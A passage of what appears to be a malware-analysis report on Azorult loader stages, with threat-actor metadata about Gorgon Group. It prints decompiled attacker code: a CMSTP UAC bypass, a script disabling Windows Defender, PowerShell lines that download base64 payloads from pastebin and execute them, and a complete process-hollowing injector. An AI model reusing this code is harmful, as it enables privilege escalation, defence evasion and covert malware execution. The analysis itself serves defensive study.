stringBuilder.Append(\".inf\");\n  StringBuilder stringBuilder2 = new StringBuilder(CMSTPBypass.InfData);\n  stringBuilder2.Replace(\"REPLACE_COMMAND_LINE\", CommandToExecute);\n  File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString());\n  return stringBuilder.ToString();\n}\n\n The function gets a random file name, in the same way as the other random file name is obtained, and refers to the same temp folder within the Windows directory. In there, a .inf file is created, which is filled with the content from the global InfData variable. At last, the string REPLACE_COMMAND_LINE is replaced with the argument that is provided to this function. After that, all data is written to the created path, and the complete path is returned.\n\n The CMSTP binary, to which the global variable BinaryPath contains the full path, is used to add or remove a connection manager profile, as is documented here. The next part of the code is given below.\n\n```\n\n-----\n\n```\nProcess.Start(new ProcessStartInfo(CMSTPBypass.BinaryPath)\n{\n  Arguments = \"/au \" + stringBuilder.ToString(),\n  UseShellExecute = false,\n  CreateNoWindow = true,\n  WindowStyle = ProcessWindowStyle.Hidden\n});\nIntPtr value = 0;\nvalue = IntPtr.Zero;\ndo\n{\n  value = CMSTPBypass.SetWindowActive(\"cmstp\");\n}\nwhile (value == IntPtr.Zero);\nSendKeys.SendWait(\"{ENTER}\");\n\n#### The process is started with the /au (short for all users) flag, to install the profile for all users. Addtitionally, the shell will not be used to install it, there will be no window created, and the window style is hidden. After the process is created, a loop to get the CMSTP window is entered, and will only be left once the window is found, since the pointer is not null at that point. Once it is found, the enter key is sent, which confirms the creation of the profile via the defaultly selected OK button. The code for the SetWindowActive function is given below.\n// Token: 0x06000005 RID: 5 RVA: 0x000021F8 File Offset: 0x000003F8\npublic static IntPtr SetWindowActive(string ProcessName)\n{\n  Process[] processesByName = Process.GetProcessesByName(ProcessName);\n  if (processesByName.Length == 0)\n  {\n    return IntPtr.Zero;\n  }\n  processesByName[0].Refresh();\n  IntPtr intPtr = 0;\n  intPtr = processesByName[0].MainWindowHandle;\n  if (intPtr == IntPtr.Zero)\n  {\n    return IntPtr.Zero;\n  }\n  CMSTPBypass.SetForegroundWindow(intPtr);\n  CMSTPBypass.ShowWindow(intPtr, 5);\n  return intPtr;\n}\n\n The complete script, including the replacement command, is given below. This script is the User Account Control bypass that Oddvar Moe blogged about on the 15th of August 2017. Tyler Applebaum wrote a PowerShell script that is equal to the Dot Net binary that is analysed above. The complete class can be found here. The original script to disable Windows Defender can be found here.\n\n```\n\n-----\n\n```\n[version]\nSignature=$chicago$\nAdvancedINF=2.5\n[DefaultInstall]\nCustomDestination=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n[RunPreSetupCommandsSection]\n; Commands Here will be run Before Setup Begins to install\nIf Not WScript.Arguments.Named.Exists(\"elevate\") Then\n CreateObject(\"Shell.Application\").ShellExecute WScript.FullName _\n , \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevate\", \"\", \"runas\", 1\n WScript.Quit\nEnd If\nOn Error Resume Next\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\nDefender\\DisableAntiSpyware\",\"0\",\"REG_DWORD\"\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time\nProtection\\DisableBehaviorMonitoring\",\"0\",\"REG_DWORD\"\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time\nProtection\\DisableOnAccessProtection\",\"0\",\"REG_DWORD\"\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time\nProtection\\DisableScanOnRealtimeEnable\",\"0\",\"REG_DWORD\"\nWScript.Sleep 100\noutputMessage(\"Set-MpPreference -DisableRealtimeMonitoring $true\")\noutputMessage(\"Set-MpPreference -DisableBehaviorMonitoring $true\")\noutputMessage(\"Set-MpPreference -DisableBlockAtFirstSeen $true\")\noutputMessage(\"Set-MpPreference -DisableIOAVProtection $true\")\noutputMessage(\"Set-MpPreference -DisableScriptScanning $true\")\noutputMessage(\"Set-MpPreference -SubmitSamplesConsent 2\")\noutputMessage(\"Set-MpPreference -MAPSReporting 0\")\noutputMessage(\"Set-MpPreference -HighThreatDefaultAction 6 -Force\")\noutputMessage(\"Set-MpPreference -ModerateThreatDefaultAction 6\")\noutputMessage(\"Set-MpPreference -LowThreatDefaultAction 6\")\noutputMessage(\"Set-MpPreference -SevereThreatDefaultAction 6\")\nSub outputMessage(byval args)\nOn Error Resume Next\nSet objShell = CreateObject(\"Wscript.shell\")\nobjShell.run(\"powershell \" + args), 0\nEnd Sub\ntaskkill /IM cmstp.exe /F\n[CustInstDestSectionAllUsers]\n49000,49001=AllUSer_LDIDSection, 7\n[AllUSer_LDIDSection]\n\\\"HKLM\\\", \\\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE\\\",\n\\\"ProfileInstallPath\\\", \\\"%UnexpectedError%\\\", \\\"\\\"\n\n```\n\n-----\n\n```\n[Strings]\nServiceName=\\\"NyanCat\\\"\nShortSvcName=\\\"NyanCat\\\"\n\n#### By evading the User Account Control, the script can run with elevated privileges, and thus disable Windows Defender succesfully.\n\n## Stage 5 – Loading Azorult\n\n#### The last stage uses two binaries. The first one is a base64 encoded PowerShell script, which is decoded and then executed. The code that is used in the malware to achieve this, is given below.\n$t= New-Object -Com Microsoft.XMLHTTP;\n$t.open('GET','https://pastebin.com/raw/5sfgNap6',$false);\n$t.send();\n$ty=\n[Text.Encoding]::'UTF8'.'GetString'([Convert]::'FromBase64String'($t.responseText))|IE\n\n One can simply save the base64 encoded string at the given address, decode it, and store it in a file. Upon doing so, the following script becomes visible.\nfunction Get-DecompressedByteArray {\n     [CmdletBinding()]\n  Param ([byte[]] $byteArray)\n     Process {\n       Write-Verbose \"Get-DecompressedByteArray\"\n    $input = New-Object System.IO.MemoryStream(, $byteArray )\n       $output = New-Object System.IO.MemoryStream\n      $gzipStream = New-Object System.IO.Compression.GzipStream $input,\n([IO.Compression.CompressionMode]::Decompress)\n  $buffer = New-Object byte[](1024)\n  while($true){\n    $read = $gzipstream.Read($buffer, 0, 1024)\n    if ($read -le 0){break}\n    $output.Write($buffer, 0, $read)\n    }\n          [byte[]] $byteOutArray = $output.ToArray()\n    Write-Output $byteOutArray\n  }\n}\n$t0='DEX'.replace('D','I');sal g $t0;[Byte[]]$Cli=('!1F,!8B,!08,\n[...],!F8,!00,!00'.replace('!','0x'))| g;\n[byte[]]$decompressedByteArray = Get-DecompressedByteArray $Cli\n\n```\n\n-----\n\n#### By appending the following code, one can save the Dot Net binary.\n```\n$decompressedByteArray | Set-Content stage5-loader.dll -Encoding Byte\n\n Inspecting it using dnSpy reveals that it is obfuscated using ConfuserEx v1.0.0. To deobfuscate the binary, one can use de4dot-cex, which is a modified version of de4dot and supports the deobfuscation of this version of ConfuserEx. Provide the binary as the sole argument to the program, and the deobfuscated binray will be created in the same directory, as can be seen below.\nPS C:\\Users\\user\\Desktop\\de4dot-cex> ./de4dot stage5-loader.dll\nde4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com\nLatest version and source code: https://github.com/0xd4d/de4dot\nDetected ConfuserEx v1.0.0 (C:\\Users\\user\\Desktop\\stage5-loader.dll)\nCleaning C:\\Users\\John\\Desktop\\stage5-loader.dll\nRenaming all obfuscated symbols\nSaving C:\\Users\\user\\Desktop\\stage5-loader-cleaned.dll\nPress any key to exit...\n\n When opening the cleaned binary in dnSpy, one can read the code normally.\n\n Based on the way the binary is loaded, the function (and the class it resides in) is known. Addtionally, the parameters are known: “svchost.exe” and the newly obtained byte array. The code is given below.\n[Byte[]]$Cli2= iex(iex('(&(GCM *W-O*)'+\n'Net.WebClient).DownloadString(''https://pastebin.com/raw/82GQmFar'').replace(''#'',''\n | g;\n$t=[System.Reflection.Assembly]::Load($decompressedByteArray);\n[Givara]::FreeDom('svchost.exe',$Cli2)\n\n The FeeDom function within the Givara class is given below.\n// Token: 0x02000004 RID: 4\npublic class Givara\n{\n  // Token: 0x06000023 RID: 35 RVA: 0x000023F0 File Offset: 0x000005F0\n  public static void FreeDom(string FTONJ, byte[] coco)\n  {\n    HeHe heHe = new HeHe();\n    heHe.Daym(FTONJ, coco);\n  }\n}\n\n This function instantiates a new object and calls a function that is present within the object. The Daym function is given below.\n\n```\n\n-----\n\n```\n// Token: 0x0600001C RID: 28 RVA: 0x000022D4 File Offset: 0x000004D4\npublic void Daym(string FTONJ, byte[] coco)\n{\n  try\n  {\n    string text = HeHe.smethod_1(\"C:\\\\WINDOWS\\\\syswow64\\\\\", FTONJ);\n    string text2 = HeHe.smethod_1(\"C:\\\\WINDOWS\\\\system32\\\\\", FTONJ);\n    string text3 = HeHe.smethod_1(\"C:\\\\WINDOWS\\\\\", FTONJ);\n    string text4 =\nHeHe.smethod_1(\"C:\\\\WINDOWS\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\\", FTONJ);\n    string text5 =\nHeHe.smethod_1(\"C:\\\\WINDOWS\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\\", FTONJ);\n    if (HeHe.smethod_2(text))\n    {\n      HeHe.tickleme(text, coco);\n    }\n    else if (!HeHe.smethod_2(text2))\n    {\n      if (!HeHe.smethod_2(text3))\n      {\n        if (!HeHe.smethod_2(text4))\n        {\n          if (!HeHe.smethod_2(text5))\n          {\n            HeHe.tickleme(HeHe.smethod_1(HeHe.smethod_4(HeHe.smethod_3(),\n\"Framework64\", \"Framework\"), FTONJ), coco);\n          }\n          else\n          {\n            HeHe.tickleme(text5, coco);\n          }\n        }\n        else\n        {\n          HeHe.tickleme(text4, coco);\n        }\n      }\n      else\n      {\n        HeHe.tickleme(text3, coco);\n      }\n    }\n    else\n    {\n      HeHe.tickleme(text2, coco);\n    }\n  }\n  catch\n  {\n  }\n}\n\n#### To understand this function, several other functions need to be analysed first, as they are called within the code that is given above. The first two functions are given below.\n\n```\n\n-----\n\n```\n// Token: 0x0600001F RID: 31 RVA: 0x0000206B File Offset: 0x0000026B\nstatic string smethod_1(string string_0, string string_1)\n{\n  return string_0 + string_1;\n}\n// Token: 0x06000020 RID: 32 RVA: 0x000020F2 File Offset: 0x000002F2\nstatic bool smethod_2(string string_0)\n{\n  return File.Exists(string_0);\n}\n\n#### The first function simply concatenates the two given strings, whereas the second function checks if a file exists, based on the given path.\n\n The functions smethod_3 and smethod_4 are given below.\n// Token: 0x06000021 RID: 33 RVA: 0x000020FA File Offset: 0x000002FA\nstatic string smethod_3()\n{\n     return RuntimeEnvironment.GetRuntimeDirectory();\n}\n// Token: 0x06000022 RID: 34 RVA: 0x00002101 File Offset: 0x00000301\nstatic string smethod_4(string string_0, string string_1, string string_2)\n{\n  return string_0.Replace(string_1, string_2);\n}\n\n The third function gets the directory of the Dot Net runtime. The fourth function replaces the value of string_1 with string_2 in string_0.\n\n This clarifies the Daym function above, as it appends the FTONJ variable to several paths. The value of FTONJ is equal to svchost.exe, since the variable was passed throughout all function calls prior to this. After that, the existence of the file is checked. If it does not exist, the next path is tried. Once it is found, the tickleme function is called. The function is given below.\n\n```\n\n-----\n\n```\n// Token: 0x0600001D RID: 29 RVA: 0x000023B4 File Offset: 0x000005B4\npublic static object tickleme(string b, byte[] PL)\n{\n  object result;\n  try\n  {\n    Fuck.FUN(b, PL, true);\n    result = 0;\n  }\n  catch\n  {\n    result = 0;\n  }\n  return result;\n}\n\n#### This function simply calls the FUN function, which resides in the class named Fuck. The FUN function is given below.\n// Token: 0x06000032 RID: 50 RVA: 0x00002474 File Offset: 0x00000674\npublic static bool FUN(string path, byte[] data, bool protect)\n{\n  bool result;\n  try\n  {\n    for (int i = 1; i <= 5; i++)\n    {\n      if (Fuck.smethod_1(path, data, protect))\n      {\n        return true;\n      }\n    }\n    result = false;\n  }\n  catch\n  {\n    result = false;\n  }\n  return result;\n}\n\n This method executes smethod_1 until the function succeeds, with a maximum of five tries. If none of these five times results in a successful exception, nor a return value of true from smethod_1, the function will return false. This will cause the code to move on to the next call of the tickleme function within the Daym function, which will eventually reach this point of the code again but then with a different path. This continues until the smethod_1 call in the FUN function is succesfull, or when all methods have been exhausted. The smethod_1 is given below in its entirety.\n\n```\n\n-----\n\n```\n// Token: 0x06000034 RID: 52 RVA: 0x000024F0 File Offset: 0x000006F0\nprivate static bool smethod_1(string string_1, byte[] byte_0, bool bool_0)\n{\n  int num = 0;\n  string commandLine = \"\\\"{path}\\\"\";\n  Fuck.Struct1 @struct = default(Fuck.Struct1);\n  Fuck.Struct0 struct2 = default(Fuck.Struct0);\n  @struct.uint_0 =\nFuck.smethod_5(Fuck.smethod_4(Fuck.smethod_2(typeof(Fuck.Struct1).TypeHandle)));\n  try\n  {\n    if (!Fuck.delegate0_0(string_1, commandLine, IntPtr.Zero, IntPtr.Zero, false,\n4u, IntPtr.Zero, null, ref @struct, ref struct2))\n    {\n      throw Fuck.smethod_6();\n    }\n    MethodInfo methodBase_ =\nFuck.smethod_2(typeof(BitConverter).TypeHandle).method_0(\"ToInt32\");\n    object[] object_ = new object[]\n    {\n      byte_0,\n      60\n    };\n    int num2 = Fuck.smethod_8(Fuck.smethod_7(methodBase_, null, object_));\n    object[] object_2 = new object[]\n    {\n      byte_0,\n      num2 + 26 + 26\n    };\n    int num3 = Fuck.smethod_8(Fuck.smethod_7(methodBase_, null, object_2));\n    int[] array = new int[179];\n    array[0] = 65538;\n    if (IntPtr.Size != 4)\n    {\n      if (!Fuck.delegate2_0(struct2.intptr_1, array))\n      {\n        throw Fuck.smethod_6();\n      }\n    }\n    else if (!Fuck.delegate1_0(struct2.intptr_1, array))\n    {\n      throw Fuck.smethod_6();\n    }\n    int num4 = array[41];\n    int num5 = 0;\n    if (!Fuck.delegate5_0(struct2.intptr_0, num4 + 4 + 4, ref num5, 4, ref num))\n    {\n      throw Fuck.smethod_6();\n    }\n    if (num3 == num5 && Fuck.delegate7_0(struct2.intptr_0, num5) != 0)\n    {\n      throw Fuck.smethod_6();\n    }\n    object[] object_3 = new object[]\n    {\n\n```\n\n-----\n\n```\n      byte_0,\n      num2 + 80\n    };\n    int length = Fuck.smethod_8(Fuck.smethod_7(methodBase_, null, object_3));\n    object[] object_4 = new object[]\n    {\n      byte_0,\n      num2 + 42 + 42\n    };\n    int bufferSize = Fuck.smethod_8(Fuck.smethod_7(methodBase_, null, object_4));\n    bool flag = false;\n    int num6 = Fuck.delegate8_0(struct2.intptr_0, num3, length, 12288, 64);\n    if (num6 == 0)\n    {\n      throw Fuck.smethod_6();\n    }\n    if (!Fuck.delegate6_0(struct2.intptr_0, num6, byte_0, bufferSize, ref num))\n    {\n      throw Fuck.smethod_6();\n    }\n    int num7 = num2 + 248;\n    short num8 = Fuck.smethod_9(byte_0, num2 + 3 + 3);\n    for (int i = 0; i < (int)num8; i++)\n    {\n      object[] object_5 = new object[]\n      {\n        byte_0,\n        num7 + 6 + 6\n      };\n      int num9 = Fuck.smethod_8(Fuck.smethod_7(methodBase_, null, object_5));\n      object[] object_6 = new object[]\n      {\n        byte_0,\n        num7 + 8 + 8\n      };\n      int num10 = Fuck.smethod_8(Fuck.smethod_7(methodBase_, null, object_6));\n      object[] object_7 = new object[]\n      {\n        byte_0,\n        num7 + 20\n      };\n      int num11 = Fuck.smethod_8(Fuck.smethod_7(methodBase_, null, object_7));\n      if (num10 != 0)\n      {\n        byte[] array2 = new byte[num10];\n        MethodInfo methodBase_2 =\nFuck.smethod_2(typeof(Buffer).TypeHandle).method_0(Fuck.smethod_10(\"Bl#####ckC#####py\"\n \"#####\", \"o\"));\n        object[] object_8 = new object[]\n        {\n          byte_0,\n          num11,\n          array2,\n          0,\n          array2.Length\n\n```\n\n-----\n\n```\n        };\n        Fuck.smethod_7(methodBase_2, null, object_8);\n        if (!Fuck.delegate6_0(struct2.intptr_0, num6 + num9, array2,\narray2.Length, ref num))\n        {\n          throw Fuck.smethod_6();\n        }\n      }\n      num7 += 40;\n    }\n    byte[] buffer = Fuck.smethod_11(num6);\n    if (!Fuck.delegate6_0(struct2.intptr_0, num4 + 8, buffer, 4, ref num))\n    {\n      throw Fuck.smethod_6();\n    }\n    object[] object_9 = new object[]\n    {\n      byte_0,\n      num2 + 40\n    };\n    int num12 = Fuck.smethod_8(Fuck.smethod_7(methodBase_, null, object_9));\n    if (flag)\n    {\n      num6 = num3;\n    }\n    array[44] = num6 + num12;\n    if (IntPtr.Size != 4)\n    {\n      if (!Fuck.delegate4_0(struct2.intptr_1, array))\n      {\n        throw Fuck.smethod_6();\n      }\n    }\n    else if (!Fuck.delegate3_0(struct2.intptr_1, array))\n    {\n      throw Fuck.smethod_6();\n    }\n    if (Fuck.delegate9_0(struct2.intptr_1) == -1)\n    {\n      throw Fuck.smethod_6();\n    }\n  }\n  catch\n  {\n    Process object_10 = Fuck.smethod_13(Fuck.smethod_12(struct2.uint_0));\n    Type type_ = Fuck.smethod_14(object_10);\n    MethodInfo methodBase_3 = Fuck.smethod_15(type_, \"Kill\");\n    Fuck.smethod_7(methodBase_3, object_10, null);\n    return false;\n  }\n  return true;\n}\n\n#### To make the code more readable, the code needs to be refactored. By analysing and renaming other functions and variables first the code becomes clearer\n\n```\n\n-----\n\n#### The three arguments, string_1, byte_0, and bool_0 can be renamed into path, data, and protect respectively. This is based upon the variable names that are used when calling smethod_1 from FUN.\n\n All functions that are named smethod_N, where N is a number, are based upon a single line of code. As such, renaming these can be done based upon their functionality. The exception here is smethod_0, which is used together with the FlipString function to instantiate nearly all delegates. The latter is given below.\n```\n// Token: 0x06000035 RID: 53 RVA: 0x000029A0 File Offset: 0x00000BA0\npublic static string FlipString(string s)\n{\n     char[] array = toCharArray(s);\n     string text = string.Empty;\n     for (int i = array.Length - 1; i > -1; i--)\n     {\n          text += array[i].ToString();\n     }\n     return text;\n}\n\n This function reverses the given string. Within all but one delegate instance, a string named string_0 is used. This string is equal to reverse value of 23lenrek, which is kernel32. The delegate instances are given below.\n\n```\n\n-----\n\n```\n// Token: 0x04000005 RID: 5\nprivate static readonly Fuck.Delegate0 delegate0_0 = Fuck.smethod_0<Fuck.Delegate0>\n(Fuck.string_0, Fuck.FlipString(\"AssecorPetaerC\"));\n// Token: 0x04000006 RID: 6\nprivate static readonly Fuck.Delegate1 delegate1_0 = Fuck.smethod_0<Fuck.Delegate1>\n(Fuck.string_0, Fuck.FlipString(\"txetnoCdaerhTteG\"));\n// Token: 0x04000007 RID: 7\nprivate static readonly Fuck.Delegate2 delegate2_0 = Fuck.smethod_0<Fuck.Delegate2>\n(Fuck.string_0, Fuck.FlipString(\"txetnoCdaerhTteG46woW\"));\n// Token: 0x04000008 RID: 8\nprivate static readonly Fuck.Delegate3 delegate3_0 = Fuck.smethod_0<Fuck.Delegate3>\n(Fuck.string_0, Fuck.FlipString(\"txetnoCdaerhTteS\"));\n// Token: 0x04000009 RID: 9\nprivate static readonly Fuck.Delegate4 delegate4_0 = Fuck.smethod_0<Fuck.Delegate4>\n(Fuck.string_0, Fuck.FlipString(\"txetnoCdaerhTteS46woW\"));\n// Token: 0x0400000A RID: 10\nprivate static readonly Fuck.Delegate5 delegate5_0 = Fuck.smethod_0<Fuck.Delegate5>\n(Fuck.string_0, Fuck.FlipString(\"yromeMssecorPdaeR\"));\n// Token: 0x0400000B RID: 11\nprivate static readonly Fuck.Delegate6 delegate6_0 = Fuck.smethod_0<Fuck.Delegate6>\n(Fuck.string_0, Fuck.FlipString(\"yromeMssecorPetirW\"));\n// Token: 0x0400000C RID: 12\nprivate static readonly Fuck.Delegate7 delegate7_0 = Fuck.smethod_0<Fuck.Delegate7>\n(Fuck.FlipString(\"lldtn\"), Fuck.FlipString(\"noitceSfOweiVpamnUwZ\"));\n// Token: 0x0400000D RID: 13\nprivate static readonly Fuck.Delegate8 delegate8_0 = Fuck.smethod_0<Fuck.Delegate8>\n(Fuck.string_0, Fuck.FlipString(\"xEcollAlautriV\"));\n// Token: 0x0400000E RID: 14\nprivate static readonly Fuck.Delegate9 delegate9_0 = Fuck.smethod_0<Fuck.Delegate9>\n(Fuck.string_0, Fuck.FlipString(\"daerhTemuseR\"));\n\n#### Each instance represents a function that is used to inject the malware into the malicious code. Refactoring each delegate will further clean the code. Below, the Fuck.smethod_1 is given with the refactored arguments, function names, and delegate names.\n\n```\n\n-----\n\n```\n// Token: 0x06000034 RID: 52 RVA: 0x000024F0 File Offset: 0x000006F0\nprivate static bool smethod_1(string path, byte[] data, bool protect)\n{\n  int num = 0;\n  string commandLine = \"\\\"{path}\\\"\";\n  Fuck.Struct1 @struct = default(Fuck.Struct1);\n  Fuck.Struct0 struct2 = default(Fuck.Struct0);\n  @struct.uint_0 =\ntoUInt32(sizeOf(getTypeFromHandle(typeof(Fuck.Struct1).TypeHandle)));\n  try\n  {\n    if (!delegateCreateProcessA(path, commandLine, IntPtr.Zero, IntPtr.Zero,\nfalse, 4u, IntPtr.Zero, null, ref @struct, ref struct2))\n    {\n      throw throwException();\n    }\n    MethodInfo methodBase_ =\ngetTypeFromHandle(typeof(BitConverter).TypeHandle).getMethod(\"ToInt32\");\n    object[] object_ = new object[]\n    {\n      data,\n      60\n    };\n    int num2 = toInt32(invokeWithTwoArguments(methodBase_, null, object_));\n    object[] object_2 = new object[]\n    {\n      data,\n      num2 + 26 + 26\n    };\n    int num3 = toInt32(invokeWithTwoArguments(methodBase_, null, object_2));\n    int[] array = new int[179];\n    array[0] = 65538;\n    if (IntPtr.Size != 4)\n    {\n      if (!delegateWow64GetThreadContext(struct2.intptr_1, array))\n      {\n        throw throwException();\n      }\n    }\n    else if (!delegateGetThreadContext(struct2.intptr_1, array))\n    {\n      throw throwException();\n    }\n    int num4 = array[41];\n    int num5 = 0;\n    if (!delegateReadProcessMemory(struct2.intptr_0, num4 + 4 + 4, ref num5, 4,\nref num))\n    {\n      throw throwException();\n    }\n    if (num3 == num5 && delegateZwUnmapViewOfSection(struct2.intptr_0, num5) !=\n0)\n    {\n      throw throwException();\n    }\n\n```\n\n-----\n\n```\n    object[] object_3 new object[]\n    {\n      data,\n      num2 + 80\n    };\n    int length = toInt32(invokeWithTwoArguments(methodBase_, null, object_3));\n    object[] object_4 = new object[]\n    {\n      data,\n      num2 + 42 + 42\n    };\n    int bufferSize = toInt32(invokeWithTwoArguments(methodBase_, null,\nobject_4));\n    bool flag = false;\n    int num6 = delegateVirtualAllocEx(struct2.intptr_0, num3, length, 12288, 64);\n    if (num6 == 0)\n    {\n      throw throwException();\n    }\n    if (!delegateWriteProcessMemory(struct2.intptr_0, num6, data, bufferSize, ref\nnum))\n    {\n      throw throwException();\n    }\n    int num7 = num2 + 248;\n    short num8 = toInt16(data, num2 + 3 + 3);\n    for (int i = 0; i < (int)num8; i++)\n    {\n      object[] object_5 = new object[]\n      {\n        data,\n        num7 + 6 + 6\n      };\n      int num9 = toInt32(invokeWithTwoArguments(methodBase_, null, object_5));\n      object[] object_6 = new object[]\n      {\n        data,\n        num7 + 8 + 8\n      };\n      int num10 = toInt32(invokeWithTwoArguments(methodBase_, null, object_6));\n      object[] object_7 = new object[]\n      {\n        data,\n        num7 + 20\n      };\n      int num11 = toInt32(invokeWithTwoArguments(methodBase_, null, object_7));\n      if (num10 != 0)\n      {\n        byte[] array2 = new byte[num10];\n        MethodInfo methodBase_2 =\ngetTypeFromHandle(typeof(Buffer).TypeHandle).getMethod(stringReplaceArgTwoWithThree(\"B\n \"#####\", \"o\"));\n        object[] object_8 = new object[]\n        {\n          data,\n\n```\n\n-----\n\n```\n          num11,\n          array2,\n          0,\n          array2.Length\n        };\n        invokeWithTwoArguments(methodBase_2, null, object_8);\n        if (!delegateWriteProcessMemory(struct2.intptr_0, num6 + num9,\narray2, array2.Length, ref num))\n        {\n          throw throwException();\n        }\n      }\n      num7 += 40;\n    }\n    byte[] buffer = convertIntToBytes(num6);\n    if (!delegateWriteProcessMemory(struct2.intptr_0, num4 + 8, buffer, 4, ref\nnum))\n    {\n      throw throwException();\n    }\n    object[] object_9 = new object[]\n    {\n      data,\n      num2 + 40\n    };\n    int num12 = toInt32(invokeWithTwoArguments(methodBase_, null, object_9));\n    if (flag)\n    {\n      num6 = num3;\n    }\n    array[44] = num6 + num12;\n    if (IntPtr.Size != 4)\n    {\n      if (!delegateWow64SetThreadContext(struct2.intptr_1, array))\n      {\n        throw throwException();\n      }\n    }\n    else if (!delegateSetThreadContext(struct2.intptr_1, array))\n    {\n      throw throwException();\n    }\n    if (delegateResumeThread(struct2.intptr_1) == -1)\n    {\n      throw throwException();\n    }\n  }\n  catch\n  {\n    Process object_10 = getProccessById(toInt32_also(struct2.uint_0));\n    Type type_ = getType(object_10);\n    MethodInfo methodBase_3 = useObjectGetMethod(type_, \"Kill\");\n    invokeWithTwoArguments(methodBase_3, object_10, null);\n    return false;\n  }\n\n```\n\n-----\n\n```\n  return true;\n}\n\n#### In the code above, an injection technique named Process Hollowing is used, as can be read about on the MITRE site.\n\n The function above uses several system calls, where an instance of svchost is launched using the CreateProcessA function. The dwCreationFlags argument equals 4, which is equal to CREATE_SUSPENDED, as can be seen here. This means that the process is created, but not started.\n\n After that, a check is done based upon the size of a pointer. If the pointer pointer size is not equal to 4 bytes (which equals 32-bits), the system architecture is 64-bits. Based on that, either GetThreadContext Wow64GetThreadContext is called. On 64-bit systems,the Wow64* name stands for Windows on Windows, as can be read in the documentation.\n\n A call is then made to the ReadProcessMemory function to read the data of the svchost process. Using ZwUnmapViewOfSection, a view is unmapped from the process. A view is part of a process’ memory. A new memory segment is allocated using VirtualAllocEx, to which the Azorult binary is then written using WriteProcessMemory. Before resuming the thread with ResumeThread, the system should know where to continue the execution, which is done with either SetThreadContext or Wow64SetThreadContext, based on the bitness of the system. At last, the function returns true.\n\n If anything goes wrong during this process, the svchost process is killed, and the value false is returned.\n\n The used code, before the obfuscation was applied, can be found here.\n\n This way, the Azorult binary is loaded into a hollowed instance of svchost, after which it is executed.\n\n## Conclusion\n\n#### A single Excel document resulted in an attack that consisted of programs and scripts written in several languages: VBA, JavaScript, VBScript, PowerShell, and C#. Additionally, the UAC was bypassed, most of the execution was done in-memory, Living of the Land Binaries were used, Windows Defender was disabled, and a process injection technique was used.\n\n It is easy to get lost in the details of such an attack, due to the amount of stages, languages and techniques. Making notes along the way helps a great deal, as well as mapping the stages, be it mentally, digitally, or on paper.\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-26 - Azorult loader stages.pdf"
    ],
    "report_names": [
        "2020-03-26 - Azorult loader stages.pdf"
    ],
    "threat_actors": [
        {
            "id": "6c4e4b91-1f98-49e2-90e6-435cea8d3d53",
            "created_at": "2022-10-25T16:07:23.693797Z",
            "updated_at": "2025-03-27T02:02:09.924056Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "ATK 92",
                "Pasty Draco",
                "Subaat",
                "TAG-CR5"
            ],
            "source_name": "ETDA:Gorgon Group",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Atros2.CKPN",
                "Bladabindi",
                "CinaRAT",
                "Crimson RAT",
                "ForeIT",
                "Jorik",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "MSIL",
                "MSIL/Crimson",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Origin Logger",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "SEEDOOR",
                "Scarimson",
                "Socmer",
                "Yggdrasil",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "66fc98f4-8978-401e-9b73-81c3d5f1e44c",
            "created_at": "2024-05-01T02:03:08.050109Z",
            "updated_at": "2025-03-27T02:05:17.327953Z",
            "deleted_at": null,
            "main_name": "COPPER FIELDSTONE",
            "aliases": [
                "Gorgon Group",
                "Green Havildar ",
                "Mythic Leopard ",
                "Operation C-Major ",
                "Operation Transparent Tribe ",
                "Pasty Draco ",
                "ProjectM ",
                "Storm-0156 ",
                "APT36 "
            ],
            "source_name": "Secureworks:COPPER FIELDSTONE",
            "tools": [
                " DarkComet",
                " LuminosityLink",
                " Peppy",
                " njRAT",
                "Crimson RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "18278778-fa63-4a9a-8988-4d266b8c5c1a",
            "created_at": "2023-01-06T13:46:38.769816Z",
            "updated_at": "2025-03-27T02:00:02.914024Z",
            "deleted_at": null,
            "main_name": "The Gorgon Group",
            "aliases": [
                "ATK92",
                "G0078",
                "Pasty Gemini",
                "Gorgon Group",
                "Subaat"
            ],
            "source_name": "MISPGALAXY:The Gorgon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "97fdaf9f-cae1-4ccc-abe2-76e5cbc0febd",
            "created_at": "2022-10-25T15:50:23.296989Z",
            "updated_at": "2025-03-27T02:00:55.432751Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "Gorgon Group"
            ],
            "source_name": "MITRE:Gorgon Group",
            "tools": [
